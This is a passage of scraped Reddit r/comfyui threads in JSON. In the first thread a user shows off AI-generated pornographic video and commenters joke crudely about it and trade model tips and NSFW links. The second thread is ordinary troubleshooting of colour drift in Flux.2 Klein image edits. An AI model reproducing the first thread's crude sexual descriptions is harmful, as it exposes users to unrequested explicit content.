hard to pull off atm).\n\nNot a great piece of work and doesn't hold a candle to what I see on civit, but I'm patting myself on the back for a baby-step achievement. More to come, as I put this woman to work (and upgrade to an OC 5090 asap üòÇ)\n\nNext few learning goals: Achieving extreme photo-realism to the extent that current models and loras allow it.",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qok1hi/i_did_it_nsfw/",
      "domain": "self.comfyui",
      "is_self": true,
      "comments": [
        {
          "id": "o22qs8c",
          "author": "TekaiGuy",
          "text": "For anyone here after the link is deleted: it looks like if you averaged of all of Kanye's girlfriends, on her knees soaked in frosting, chewing on a sausage with that weird bottom lip/tongue that ai messes up all the time.",
          "score": 61,
          "created_utc": "2026-01-27 19:42:45",
          "is_submitter": false,
          "replies": [
            {
              "id": "o249ttl",
              "author": "NessLeonhart",
              "text": "I didn‚Äôt even need to close my eyes to see this woman. Vivid detail! Vivid!",
              "score": 7,
              "created_utc": "2026-01-28 00:00:05",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o22woe3",
              "author": "PomegranateNo7242",
              "text": "Nooooooooooo I wanted only a bit more Armenian facial features but not at the cost of intercanthal niceties! I will improve, I promise",
              "score": 5,
              "created_utc": "2026-01-27 20:08:58",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o235uv4",
                  "author": "TekaiGuy",
                  "text": "Don't sleep on those zygos either, and pay attention to the buccal corridors.",
                  "score": 4,
                  "created_utc": "2026-01-27 20:50:42",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o23nk0q",
              "author": "CheemsBorgar92",
              "text": "I didn't notice the weird mouth at first haha",
              "score": 1,
              "created_utc": "2026-01-27 22:09:40",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o225g4b",
          "author": "Smooth-Bid9662",
          "text": "The fap moving mountains again. üéÜ\nCongrats!",
          "score": 78,
          "created_utc": "2026-01-27 18:11:00",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o22pk9c",
          "author": "Boogertwilliams",
          "text": "Congratulats. Still some way to go üòâ there's a bit too much \"liquid\" and it still looks more like she's eating it, biting üò¨ haha  I know that issue. It can get lots better.  Keep at it",
          "score": 9,
          "created_utc": "2026-01-27 19:37:21",
          "is_submitter": false,
          "replies": [
            {
              "id": "o22wqad",
              "author": "PomegranateNo7242",
              "text": "TY!",
              "score": 1,
              "created_utc": "2026-01-27 20:09:12",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o22295f",
          "author": "BrainSurfing",
          "text": "Please keep us updated with achieving extreme realism and your timing on learning this.",
          "score": 15,
          "created_utc": "2026-01-27 17:57:20",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2282cq",
              "author": "PomegranateNo7242",
              "text": "Goes without saying. I'm going to take another 10-12 days to focus on hyper-realism and not this sort of low quality slop. Texture, noise and grain, skin realism, movement realism - all goals for the next two weeks or so.",
              "score": 15,
              "created_utc": "2026-01-27 18:22:03",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o22ha5y",
          "author": "Alert_Salad8827",
          "text": "porn make the world go round they said? i don't even know man.",
          "score": 11,
          "created_utc": "2026-01-27 19:00:53",
          "is_submitter": false,
          "replies": [
            {
              "id": "o22ws3u",
              "author": "PomegranateNo7242",
              "text": "ü§£",
              "score": 2,
              "created_utc": "2026-01-27 20:09:26",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2201fd",
          "author": "HellkerN",
          "text": "Why is she gnawing on the tip, lmao? Gotta pump a bit more:  \nVery NSFW link, obviously, and ignore the anime eyes towards the end, couldn't be assed to redo because I'm struggling with an 8GB 4060 here. [https://limewire.com/d/9h5PQ#Wd2mjuov3W](https://limewire.com/d/9h5PQ#Wd2mjuov3W)",
          "score": 16,
          "created_utc": "2026-01-27 17:47:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2212dq",
              "author": "Back_on_redd",
              "text": "Nice",
              "score": 3,
              "created_utc": "2026-01-27 17:52:21",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o221dj7",
              "author": "PomegranateNo7242",
              "text": "Good stuff man. My prompts are amateurish, and lack the kind of specificity in instructions that can prevent these weird outcomes. Still have a lot of learn, this is day-0 success, hence not too meaningful.",
              "score": 5,
              "created_utc": "2026-01-27 17:53:39",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o222zxo",
                  "author": "HellkerN",
                  "text": "Most likely it's your choice of models, so you can have my sauce. 4 step lightning lora,   \n\nfirst 2, or 3 steps: Smooth Mix Wan, I2V High (v 1, NOT v2)  \n\nlast step or 2: Smooth Mix Wan, I2V Low v2.0\n\n",
                  "score": 8,
                  "created_utc": "2026-01-27 18:00:29",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o229s43",
          "author": "jditty24",
          "text": "Learning in a week is pretty impressive IMO, I started I like May/June last year and gave up in July for a while and started kinda getting back into it in October and really went at it in November/December. \n\nMy biggest issue is prompts, I suck at them. I‚Äôve tired joycaption and searge llm but I don‚Äôt think they do what I want so I‚Äôm learning QwenVL now, just need the NSFW to work\n\nI have a person I‚Äôve made a ton of images on using kling that I do my I2V to and then made a zimage Lora for the T2I and it works well. \n\nIt‚Äôs nice to have this community that is very helpful other then a few asshats here and there",
          "score": 6,
          "created_utc": "2026-01-27 18:29:15",
          "is_submitter": false,
          "replies": [
            {
              "id": "o25jj6a",
              "author": "_CreationIsFinished_",
              "text": "Everywhere there is some asshats, but I find them here less - Viva La Comfy!!! :D",
              "score": 1,
              "created_utc": "2026-01-28 04:03:08",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o22dokr",
          "author": "ReidDesigns",
          "text": "8 days is impressive. Would love to see the workflow",
          "score": 3,
          "created_utc": "2026-01-27 18:45:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o225m4k",
          "author": "Verittan",
          "text": "Glad you're having fun. This is a good first step. AI generation is more akin to baking than painting. Find the right recipes (workflows), the right ingredients (checkpoints and loras), and measurements (prompts and weights). And always keep learning and iterating.\n\nThat's what differentiates this community from most AI slop. Anyone can put a few words in an online AI generator and hit enter. But comfyui is different. Whether just gooning or creating high art, we are on the cutting edge of technology and are committed to learning and continuous refinement of techniques.",
          "score": 5,
          "created_utc": "2026-01-27 18:11:43",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2279xb",
              "author": "PomegranateNo7242",
              "text": ">Anyone can put a few words in an online AI generator and hit enter.\n\nSo true, and most are scammy sites with ridiculous pricing and garbage workflows (if we can even call them that) behind the scenes. Even getting comfy running on a runpod GPU is objectively better dollar value than their shitty tokens and coins.\n\nYou're ON POINT.",
              "score": 3,
              "created_utc": "2026-01-27 18:18:47",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o226f8n",
              "author": "HellkerN",
              "text": "lmao edge",
              "score": -1,
              "created_utc": "2026-01-27 18:15:12",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o22fshz",
          "author": "Suitable-League-4447",
          "text": "??? what's this result bro?\n\nur not up to date check : [https://limewire.com/d/UrkzL#0Vtf3nH7yI](https://limewire.com/d/UrkzL#0Vtf3nH7yI)  \n[https://gofile.io/d/HC8XZh](https://gofile.io/d/HC8XZh)",
          "score": 6,
          "created_utc": "2026-01-27 18:54:35",
          "is_submitter": false,
          "replies": [
            {
              "id": "o22n41f",
              "author": "Alert_Salad8827",
              "text": "trash talking already on the news",
              "score": 5,
              "created_utc": "2026-01-27 19:26:24",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o23m297",
              "author": "dh4645",
              "text": "How detailed are your prompts? Example?",
              "score": 3,
              "created_utc": "2026-01-27 22:02:46",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o2321p3",
              "author": "whoami-0001",
              "text": "holy shi. what config & models u used?",
              "score": 2,
              "created_utc": "2026-01-27 20:33:27",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o236uej",
          "author": "ObiBananobi",
          "text": "Congratulations... and have fun with the 5090!",
          "score": 2,
          "created_utc": "2026-01-27 20:55:06",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o25jbwg",
          "author": "_CreationIsFinished_",
          "text": "Oh man, it looks like she is going to eat that thing for real tho hahhaha. \n\nStill though, you did it!! Good job!!!\n\n(try not to goon too much hahha).",
          "score": 2,
          "created_utc": "2026-01-28 04:01:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o223qdx",
          "author": "greenkalus",
          "text": "ComfyUI is hella complicated, and to save frustration I just try to remember what typing out commands and piping output to other commands to do all this would be like!",
          "score": 4,
          "created_utc": "2026-01-27 18:03:37",
          "is_submitter": false,
          "replies": [
            {
              "id": "o22iw0f",
              "author": "ZenEngineer",
              "text": "You know,  a Jupyter style interface might just be easier than dealing with spaghetti. I'll have to think of how difficult it would be to mod that in.",
              "score": 2,
              "created_utc": "2026-01-27 19:07:53",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o224ikb",
          "author": "nadhari12",
          "text": "You Can do way more realistic stuff using qwen or flux then animate using wan 2.2",
          "score": 2,
          "created_utc": "2026-01-27 18:07:00",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o22roac",
          "author": "Busy_Aide7310",
          "text": "Congrats. What brought you to ComfyUI?\n\nDid you see a post online? Or is the release of a model, or something else ?",
          "score": 2,
          "created_utc": "2026-01-27 19:46:44",
          "is_submitter": false,
          "replies": [
            {
              "id": "o22xohq",
              "author": "PomegranateNo7242",
              "text": "It was wild. I always wanted to produce porn, but in the past I couldn't be bothered with the insanity of production in blender or c4d or any other 3d software. Waaaaaaaay too laborious, not just for a single individual, even for a team (it's crazy).\n\nI asked chatgpt for ai video production recommendations, and here we are. ü§£\n\nThe learning was brutal though. ComfyUI, yeah right, that name. I thought it would be \"describe characters and scene, press button, get fap material\".\n\nBoy oh boy, what did I know I was getting into learning the foundations of ML media generation and editing ha ha.",
              "score": 4,
              "created_utc": "2026-01-27 20:13:33",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o21uiit",
          "author": "HorizonSkipX",
          "text": "Don't take it negatively but how old are you?",
          "score": -1,
          "created_utc": "2026-01-27 17:23:54",
          "is_submitter": false,
          "replies": [
            {
              "id": "o21uqqo",
              "author": "PomegranateNo7242",
              "text": "26",
              "score": 10,
              "created_utc": "2026-01-27 17:24:54",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o23ncan",
          "author": "CheemsBorgar92",
          "text": "Someday I'll do this too",
          "score": 1,
          "created_utc": "2026-01-27 22:08:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o23y5e3",
          "author": "steadyeyes",
          "text": "Congrats!!\n\nWithin this week of struggle, what do you think helped the most ? As in did you experience a *click* somewhere?\n\n Soon going to dive into comfy myself",
          "score": 1,
          "created_utc": "2026-01-27 23:00:34",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o23y5ue",
          "author": "IronicEnigmatism",
          "text": "Congrats! I've been at it for just over two months and I finally feel like i have a real clue about how the thing works. Hell, it took me a week just to figure out the difference between Forge, a1111, and comfy. Nevermind understanding the different model types.",
          "score": 1,
          "created_utc": "2026-01-27 23:00:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o245mcg",
          "author": "camiknickers",
          "text": "looks great! I'm working on NSFW workflows, but it is a bit slow going to get things right....",
          "score": 1,
          "created_utc": "2026-01-27 23:38:25",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o248yo9",
          "author": "-Nano",
          "text": "Now, wrap up everything into a dockerfile, including the workflow, and share with us!",
          "score": 1,
          "created_utc": "2026-01-27 23:55:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o22z49z",
          "author": "LurkerGhost",
          "text": "Can you share the comfyui workflow? We might be able to help you make it better.",
          "score": 0,
          "created_utc": "2026-01-27 20:20:07",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o23iuaj",
          "author": "Satoshi_Buterin",
          "text": "Great work, just a quick question ‚Äî \n\nWhat are you PC specs",
          "score": 0,
          "created_utc": "2026-01-27 21:48:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o25z68e",
          "author": "Replicant7777",
          "text": "What type of workflow did you use and how long did it take to create your chart? I would really appreciate knowing how you did it.",
          "score": 0,
          "created_utc": "2026-01-28 05:45:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o21y0fw",
          "author": "Beginning-Giraffe-33",
          "text": "don't wanna be mean, but: Wow you learned to open workflow templates and watch tutorials? I'm so proud of you\n\n#sarcasm",
          "score": -31,
          "created_utc": "2026-01-27 17:39:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o21zjc2",
              "author": "alecubudulecu",
              "text": "I think this is disingenuous. Folks need to remember comfyui is very difficult for the average person. Incredibly daunting.  \n\nI have hundreds of people ‚Ä¶ dozens of friends that have asked me what ai tool they can use that‚Äôs versatile.  I‚Äôve always recommended comfyui.  \nNot a single one of them has stuck with it.  Every single person says it‚Äôs too daunting and complicated. None of them are coders.  That‚Äôs the key.  \n\nIf you say well yeah it‚Äôs for technical power users.  Well that‚Äôs the issue.  When someone non technical tries it.  We need to be welcoming.",
              "score": 18,
              "created_utc": "2026-01-27 17:45:50",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o2215to",
                  "author": "clebo99",
                  "text": "Agree.....I have comfyui and it is a steep climb, especially when you want to replace faces on other pics, etc.  I dipped my toe in it and had a little fun but I started to get frustrated a bit and am now working on other things.  I'll come back to this some day.",
                  "score": 1,
                  "created_utc": "2026-01-27 17:52:45",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o221o7q",
                  "author": "Beginning-Giraffe-33",
                  "text": "i am autodidact. for me, Comfy was just another Tool to learn.",
                  "score": 0,
                  "created_utc": "2026-01-27 17:54:53",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o221vbo",
                  "author": "PomegranateNo7242",
                  "text": "This, so much this. All it took from was a couple of more helpful folks sharing a bit of advice, links, pointers in my first thread.\n\nI know I know, YT/Civit etc. have more tutorials, more info, more model insanity than what can be captured here, and besides, nobody is obliged to help anyone. But a few folks did, I had a quick chat with one, and here we are.",
                  "score": 0,
                  "created_utc": "2026-01-27 17:55:43",
                  "is_submitter": true,
                  "replies": []
                },
                {
                  "id": "o230c3j",
                  "author": "LickingLieutenant",
                  "text": "This.\nI always tell people to hang in there, but most fail.\nThe problem comfyui has, and the same with HomeAssistant, it is created by nerds, in the nerds working mind.\nIt works in every detail, but those are all logical in a nerds brain.\n\nThe regular end user is different, they don't want to travel from A to G to get a in-between result at J to fill in to finally reach Z.\n\nWe 'nerds' don't mind those steps, they're mostly fun to us, the proces is better over the result",
                  "score": 0,
                  "created_utc": "2026-01-27 20:25:38",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o23qjv2",
              "author": "HorribleMistake24",
              "text": "I love how you're downvoted, this is the most helpful comment in here. \n\nSo I need to learn: 1. Workflow templates and 2. Watch tutorials. Awesome. Thank you.",
              "score": 2,
              "created_utc": "2026-01-27 22:23:47",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o23r85r",
                  "author": "Beginning-Giraffe-33",
                  "text": "that's the basics on every software:\n\ncheck example files, watch others doing it",
                  "score": 2,
                  "created_utc": "2026-01-27 22:26:59",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qkgc4y",
      "title": "Flux.2 Klein 9B (Distilled) Image Edit - Image Gets More Saturated With Each Pass",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qkgc4y",
      "author": "eagledoto",
      "created_utc": "2026-01-23 03:53:08",
      "score": 86,
      "num_comments": 100,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Help Needed",
      "permalink": "https://reddit.com/r/comfyui/comments/1qkgc4y/flux2_klein_9b_distilled_image_edit_image_gets/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o171yk9",
          "author": "afinalsin",
          "text": "Everyone is correct, it's the VAE encoding/decoding that trashes it, and it's an issue with every image editing model. Even nanobanana pro will bake an image if you pass it back and forth a couple times. Unfortunately everything in the image degrades, not just the colors, so a simple color correct pass won't fix it.\n\nThere is a way to make multiple successive edits without the severe degradation, you just need to work with latents instead of images, but at the moment it's an extremely clunky process. You need to use the \"SaveLatent\" and \"LoadLatent\" nodes. \n\n[Here is a grid showing a multi-image edit](https://i.postimg.cc/c6yNgdy7/grid-00001.png) to swap a character's clothes. It is input/input/output.\n\n[And here is another grid](https://i.postimg.cc/HH5TVFFR/grid-00008.png) showing ~~7~~ 6 consecutive edits with minimal degradation.  \n\nTo use this technique, first run the first edit you want to do and save the latent and image to the same folder. This will make it easier to track which latent is which image, which will be important. It's pretty simple, and [will look like this](https://i.postimg.cc/Q8zgwFXM/Screenshot-2026-01-23-171025.png).\n\nNow the annoying part is you need to copy the latent from your/output/folder to Comfy's input folder. Make sure you copy instead of move, otherwise your image/latent name pairing will be out of sync. You'll need to do this for every successive edit you make, so if you're using windows 11 just middle click both folders to open them in new tabs in windows explorer, it will make it much easier to transfer the files.\n\nNow unpack the \"Reference conditioning\" subgraph and delete the vae encode node, and plug a \"LoadLatent\" node straight into both ReferenceLatent nodes. [It will look like this](https://i.postimg.cc/fTyNLqG3/Screenshot-2026-01-23-171144.png).\n\nImportant: You need to manually set the actual latent width and height, and the width and height of the flux2scheduler to match your input. If you feel like automating the math, Derfuu has a get latent size node, and you can combine that with math nodes to x2 the latent size to get the correct resolution. [It'll look like this](https://i.postimg.cc/nhMB3x6s/Screenshot-2026-01-23-172416.png). Then just plug the outputs into the width/height inputs.\n\nMaybe important: Change the noise seed every edit. In older models, running the same noise on the same image can burn the image extremely badly. I'm unsure if that's an issue with Klein, but better safe than sorry. \n\nNow, make your edit and save the image and latent as before. If you're happy with the image, congratulations, you're done. If you want to make further edits, simply copy-paste the correct latent from your output folder to your input, refresh comfy (just press r), and select the new input latent. Make your edit, save both image and latent, and continue, making as many edits as you want.\n\n---\n\nBefore now you've never really needed to use latents instead of images, so the user experience is awful. There's currently no preview on the latents so you're relying on explorer to see which latent corresponds to which image. The latent also has to be in the input folder, which makes it clunky to immediately switch to the new latent. \n\nI'll have a look and see if I can find a custom node pack that makes working with latents a better experience and whip up an actual workflow. I might try my hand at vibecoding a solution if there isn't one to be found because while this technique produces infinitely better results than the out of the box workflow it's just such a pain in the dick to actually use.",
          "score": 30,
          "created_utc": "2026-01-23 06:40:43",
          "is_submitter": false,
          "replies": [
            {
              "id": "o173m2d",
              "author": "eagledoto",
              "text": "Damn! Thank you so much for the detailed explanation and the work around. Will definitely try it out just out of curiosity and the time out took to write it all, and it might even come in handy later on. Thanks again man.",
              "score": 6,
              "created_utc": "2026-01-23 06:54:12",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18vb8s",
                  "author": "afinalsin",
                  "text": "Ayy, no worries.\n\nSo, I just downloaded your image and couldn't replicate. I did notice you said you removed the scaletototalpixels node. Your input image is 1536 x 2752, and the Flux2 Klein base resolution is 1 megapixel. 1536 x 2752 is 4,227,072 pixels, so you are trying to generate 2x the base resolution. \n\nFor now, bring back the scale to total pixels node and set it to 2 megapixels max. Also make sure to change the seed between generations, and that should set you up right for small edits like these. If you need to make bigger edits like putting a character in a different pose, you will likely need to drop the resolution down closer to base res. \n\nIf you want to work on the full resolution image, you'd be better off running an inpainting workflow on it, where you crop bits out of the image, make your edits on those cropped bits, and reattach. There must be a Klein inpainting workflow around somewhere, let me know if you can't find one and I'll throw one together for you.",
                  "score": 3,
                  "created_utc": "2026-01-23 14:46:52",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o19nf8p",
              "author": "roxoholic",
              "text": "You don't have to manually save/load latents. There are `Latent Sender`/`Latent Receiver` nodes in Impact Pack which make iterating a lot faster.\n\nhttps://github.com/ltdrdata/ComfyUI-extension-tutorials/blob/Main/ComfyUI-Impact-Pack/tutorial/sender_receiver.md",
              "score": 3,
              "created_utc": "2026-01-23 16:56:16",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o19uurh",
                  "author": "afinalsin",
                  "text": "Fuck yes, I knew someone was gonna come through with the goods. That looks incredibly useful, and way better than the hatchet job nodes I vibecoded. Thank you.",
                  "score": 3,
                  "created_utc": "2026-01-23 17:30:58",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o19gwvq",
              "author": "Sgsrules2",
              "text": "Use this node instead: https://github.com/Velour-Fog/comfy-latent-nodes\nIt lets you specify the location so you don't have to copy the latents. Just setup a temp file and read from it.",
              "score": 1,
              "created_utc": "2026-01-23 16:27:07",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o19veht",
                  "author": "afinalsin",
                  "text": "Hell yeah. I already vibed my way through a similar node group, but good to have options. Between this and the other guy's send/receive nodes, I'll pretty much be set. Thank you.",
                  "score": 1,
                  "created_utc": "2026-01-23 17:33:28",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16ihoz",
          "author": "BathroomEyes",
          "text": "It‚Äôs called color shifting and it‚Äôs a consequence of the vae encode/decode nodes. They‚Äôre lossy and can result in noticeable loss of sharpness and color inaccuracy. There‚Äôs a few ways you can address this. You could color correct with post processing software. If you need to do multiple sampler passes you can keep the successive outputs in latent space and only decode after the last sampler pass. TBG-Takeaways has a vae decode color shift fixer for Flux1.D so I‚Äôm hoping u/TBG______ releases one for Flux.2.",
          "score": 33,
          "created_utc": "2026-01-23 04:20:33",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16uet5",
              "author": "eagledoto",
              "text": "\"If you need to do multiple sampler passes you can keep the successive outputs in latent space and only decode after the last sampler pass\"\n\ncan you explain this part a bit more please? I am new to comfy so learning",
              "score": 5,
              "created_utc": "2026-01-23 05:41:29",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o16vj4y",
                  "author": "Haiku-575",
                  "text": "After your denoised latent comes out of the KSampler, instead of passing it to a VAE Decode node to turn it into pixels, pass it straight into another KSampler with different conditioning. Does that make sense?",
                  "score": 19,
                  "created_utc": "2026-01-23 05:49:50",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o17663a",
              "author": "JoelMahon",
              "text": "is there simply a less lossy version of the vae encode/decode nodes?",
              "score": 1,
              "created_utc": "2026-01-23 07:15:52",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1cvx2n",
                  "author": "Winter_unmuted",
                  "text": "no. it isn't the node's fault, but rather a consequence of vae encoding itself. latent space, which is what an image is vae encoded into, has less information than the input image. It's lossy. \n\nThe reconstructed image has the same amount of info as the input image did, but it doesn't \"remember\" what the input was. It just knows the latent, and what general informatino can be used to reconstruct an image from such a latent. The missing info between those two formats is made up. The data are constrained randomness. \n\nthat randomness manifests as essentially what we call degraded images. Nonsensical things like extra fingers. eyes that don't line up right or irises that aren't circular. teeth that are lopsided or the wrong number. Letters that look letter-ish but are actually nonsense. etc.",
                  "score": 2,
                  "created_utc": "2026-01-24 02:36:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o17ldoz",
              "author": "TheSquirrelly",
              "text": "The multiple samplers sounds like a good idea.  Though if you have a number of edits to do like the OP you have to hope each of the edits get it right the first time.  If you find you have to regen for each edit and get success 1 in 4 (just to make up a number) and have 3 edits, now you have a 1 in 64 chance.  But if it usually hits it the first time then should be good.",
              "score": 1,
              "created_utc": "2026-01-23 09:34:56",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o17z1d5",
                  "author": "Aromatic-Somewhere29",
                  "text": "You can chain multiple KSamplers and place a VAE decoder with image preview after each one. Bypass all but the first KSampler and keep regenerating only the first edit until you get the desired result. Once satisfied, lock the seed of the first KSampler, enable the second one, and repeat the process.",
                  "score": 3,
                  "created_utc": "2026-01-23 11:34:16",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16f231",
          "author": "marres",
          "text": "vae encode/decode and whatever other stuff the model is doing with the image degrades it.",
          "score": 8,
          "created_utc": "2026-01-23 03:59:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16gvz5",
              "author": "eagledoto",
              "text": "what if i give it a detailed prompt to keep the rest of the image as it is and just make the change that i tell it to? you think that will help?",
              "score": 1,
              "created_utc": "2026-01-23 04:10:36",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o16ihsi",
                  "author": "marres",
                  "text": "No, you can't control that with the prompt. What you would need to do is do all the editing in one pass",
                  "score": 6,
                  "created_utc": "2026-01-23 04:20:34",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16l41u",
          "author": "Most_Way_9754",
          "text": "Create a mask of the area you want to edit by using:\n\n[https://github.com/adambarbato/ComfyUI-Sa2VA](https://github.com/adambarbato/ComfyUI-Sa2VA)\n\nthen use: \n\n[https://github.com/lquesada/ComfyUI-Inpaint-CropAndStitch](https://github.com/lquesada/ComfyUI-Inpaint-CropAndStitch)",
          "score": 9,
          "created_utc": "2026-01-23 04:37:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16tzz6",
              "author": "eagledoto",
              "text": "What about using the inbuilt mask editor?",
              "score": 3,
              "created_utc": "2026-01-23 05:38:29",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o17700i",
                  "author": "Most_Way_9754",
                  "text": "i'm not skilled at using a paintbrush to paint the ear-rings, people in the background or her clothes. so i just use something like Sa2VA to automatically create the mask. you can try to mask manually using the in built tools and use the crop and stitch nodes that way.",
                  "score": 2,
                  "created_utc": "2026-01-23 07:23:09",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16r0nm",
          "author": "TechnologyGrouchy679",
          "text": "kijai's \"match color\" node might tame the saturation",
          "score": 4,
          "created_utc": "2026-01-23 05:17:01",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16u6b4",
              "author": "eagledoto",
              "text": "https://preview.redd.it/wklxr9kod1fg1.png?width=1173&format=png&auto=webp&s=fb38e808cfd8f51f581b11f6e44b63257052ebca\n\nThis correct?",
              "score": 3,
              "created_utc": "2026-01-23 05:39:46",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o16v9oh",
                  "author": "TechnologyGrouchy679",
                  "text": "yes but in this case it doesn't seem all that effective",
                  "score": 4,
                  "created_utc": "2026-01-23 05:47:51",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1ed7n3",
                  "author": "TBG______",
                  "text": "A mask is needed so the black shirt doesn‚Äôt inherit colors from the white shirt. And try to use lab or wavelet for cc.",
                  "score": 1,
                  "created_utc": "2026-01-24 09:17:34",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o18ax3o",
              "author": "sevenfold21",
              "text": "Color matching sucks for editing, because you're adding or removing pixels, and these colors can be completely different from the original.",
              "score": 2,
              "created_utc": "2026-01-23 12:57:11",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1710y8",
          "author": "_VirtualCosmos_",
          "text": "Same with Qwen Edit",
          "score": 4,
          "created_utc": "2026-01-23 06:33:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o17xe5o",
          "author": "Luke2642",
          "text": "GROUPTHINK ALERT - THIS IS NOT CAUSED BY VAE.\n\nThe colour shift is caused by the ksampler applying a STD + MEAN shift to move the distribution across the channels from being more like the noise to more like the distribution statistics of the VAE.\n\nIf you pass it through six times you get a slight fading effect, that is all. No colour shift.\n\nIf you add a latent multiply, the fading effect vanishes. No colour shift.\n\nhttps://preview.redd.it/v6zdrrp343fg1.png?width=3234&format=png&auto=webp&s=8fd5da77168a7727d09bff6209f1e766089799ac",
          "score": 8,
          "created_utc": "2026-01-23 11:21:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "o19bs7f",
              "author": "BathroomEyes",
              "text": "You really should be using the Flux2 vae in your example if you‚Äôd like to make an apples to apples demonstration. Unless that‚Äôs just what you‚Äôve renamed your flux2 vae.",
              "score": 1,
              "created_utc": "2026-01-23 16:04:06",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o19i7ro",
                  "author": "Luke2642",
                  "text": "yeah, they named it ae.safetensors originally, which I think was an error. So at least I should call it flux\\_vae.safetensors!\n\n[https://huggingface.co/black-forest-labs/FLUX.1-dev/tree/main](https://huggingface.co/black-forest-labs/FLUX.1-dev/tree/main)",
                  "score": 2,
                  "created_utc": "2026-01-23 16:32:57",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o185l2z",
              "author": "Luke2642",
              "text": "That is absolutely not all. The details degrade with each successive trip in and out of latent space, depding on the VAE.¬†[Comparison between input and 8x encode/decode cycles](https://imgsli.com/NDQ0NjY3).",
              "score": 0,
              "created_utc": "2026-01-23 12:22:31",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o18eyej",
                  "author": "eagledoto",
                  "text": "So the latent multiply works?",
                  "score": 1,
                  "created_utc": "2026-01-23 13:21:17",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16ormt",
          "author": "krigeta1",
          "text": "Same thing happened with nano banana pro gemini app too, when I am keeping asking for edits the quality degraded by each step, have you tried with an actual image? I guess it could be a thing with nano banana pro images and its watermark. But is it just amu assumption.",
          "score": 3,
          "created_utc": "2026-01-23 05:01:36",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16u9wt",
              "author": "eagledoto",
